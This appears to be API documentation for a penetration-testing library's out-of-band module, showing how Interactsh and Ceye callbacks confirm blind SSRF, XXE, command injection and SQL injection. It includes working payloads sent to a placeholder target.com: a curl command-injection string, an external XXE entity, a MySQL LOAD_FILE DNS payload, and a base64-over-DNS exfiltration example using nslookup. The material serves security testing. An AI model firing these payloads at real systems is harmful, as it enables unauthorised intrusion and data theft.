# Out-of-Band (OOB) Testing

Out-of-band interaction detection for blind vulnerability testing.

## Module: `ofx.api.oob`

Provides OOB interaction platforms for detecting blind vulnerabilities like SSRF, XXE, and command injection.

## Platforms

### Interactsh

Open-source OOB interaction platform.

```python
from ofx.api.oob import Interactsh

# Initialize client
client = Interactsh()

# Get unique URL
url = client.get_url()
# Returns: "https://cxxxxxxx.interact.sh"

# Use URL in payload
payload = f"curl {url}/callback"

# Check for interactions
interactions = client.poll()
for interaction in interactions:
    print(f"Protocol: {interaction['protocol']}")
    print(f"Request: {interaction['raw-request']}")
```

**Methods**:
- `get_url()` - Get unique OOB URL
- `poll()` - Check for interactions
- `get_all_interactions()` - Get all interactions
- `close()` - Cleanup

### Ceye

Ceye.io OOB platform (requires API key).

```python
from ofx.api.oob import Ceye

# Initialize with API key
client = Ceye(api_key="your-api-key")

# Get identifier
identifier = client.get_identifier()
domain = f"{identifier}.ceye.io"

# Use in payload
payload = f"ping -c 1 {domain}"

# Check for DNS queries
interactions = client.check_dns()
if interactions:
    print("Vulnerable! Received DNS query")

# Check for HTTP requests
http_logs = client.check_http()
```

**Methods**:
- `get_identifier()` - Get unique identifier
- `check_dns()` - Check DNS queries
- `check_http()` - Check HTTP requests  
- `check_all()` - Check all interaction types

## Use Cases

### SSRF Detection

```python
from ofx.api.oob import Interactsh

client = Interactsh()
oob_url = client.get_url()

# Test SSRF
import requests
requests.post(
    "http://target.com/api",
    json={"url": oob_url}
)

# Check for callback
interactions = client.poll()
if interactions:
    print("SSRF vulnerability confirmed!")
```

### XXE Detection

```python
from ofx.api.oob import Ceye

client = Ceye(api_key="...")
domain = f"{client.get_identifier()}.ceye.io"

# XXE payload
xxe_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{domain}/xxe">
]>
<data>&xxe;</data>
'''

# Send payload
requests.post("http://target.com/upload", data=xxe_payload)

# Check interactions
if client.check_http():
    print("XXE vulnerability confirmed!")
```

### Command Injection

```python
from ofx.api.oob import Interactsh

client = Interactsh()
oob_url = client.get_url()

# Command injection payload
payload = f"; curl {oob_url} ;"

# Test endpoint
requests.get(f"http://target.com/api?cmd={payload}")

# Verify execution
interactions = client.poll()
if interactions:
    print("Command injection confirmed!")
    print(f"User-Agent: {interactions[0]['headers']['user-agent']}")
```

### Blind SQL Injection

```python
from ofx.api.oob import Ceye
import time

client = Ceye(api_key="...")
domain = f"{client.get_identifier()}.ceye.io"

# DNS exfiltration payload (MySQL)
payload = f"' OR (SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test')) --"

# Send payload
requests.get(f"http://target.com/search?q={payload}")

# Wait for DNS query
time.sleep(2)

if client.check_dns():
    print("Blind SQL injection confirmed!")
```

## Platform Comparison

| Feature | Interactsh | Ceye |
|---------|------------|------|
| **Open Source** | ✅ Yes | ❌ No |
| **Self-hosted** | ✅ Yes | ❌ No |
| **API Key Required** | ❌ No | ✅ Yes |
| **DNS Support** | ✅ Yes | ✅ Yes |
| **HTTP Support** | ✅ Yes | ✅ Yes |
| **HTTPS Support** | ✅ Yes | ✅ Yes |
| **SMTP Support** | ✅ Yes | ❌ No |
| **FTP Support** | ❌ No | ✅ Yes |
| **Rate Limits** | Higher | Lower (free tier) |

## Best Practices

1. **Use Unique Identifiers**: Generate new URLs for each test
2. **Add Context**: Include identifiers in payloads for tracking
3. **Poll Regularly**: Check interactions periodically
4. **Cleanup**: Close clients when done
5. **Handle Rate Limits**: Respect platform limits

## Advanced Usage

### Custom Interactsh Server

```python
from ofx. import Interactsh

# Use custom server
client = Interactsh(server="https://your-server.com")
url = client.get_url()
```

### Interaction Filtering

```python
from ofx.api.oob import Interactsh

client = Interactsh()
url = client.get_url()

# Send payloads...

# Filter specific interaction types
dns_interactions = [
    i for i in client.poll()
    if i['protocol'] == 'dns'
]

http_interactions = [
    i for i in client.poll()
    if i['protocol'] == 'http'
]
```

### Data Exfiltration

```python
from ofx.api.oob import Ceye
import base64

client = Ceye(api_key="...")
domain = f"{client.get_identifier()}.ceye.io"

# Exfiltrate data via DNS subdomain
data = "sensitive_data"
encoded = base64.b64encode(data.encode()).decode()
exfil_domain = f"{encoded}.{domain}"

# Trigger DNS query with data
payload = f"nslookup { exfil_domain}"

# Retrieve data from interactions
interactions = client.check_dns()
for interaction in interactions:
    subdomain = interaction['name'].split('.')[0]
    exfiltrated = base64.b64decode(subdomain).decode()
    print(f"Exfiltrated: {exfiltrated}")
```

## See Also

- [Exploitation API](../exploitation/index.md)
- [HTTP API](../exploitation/http.md)
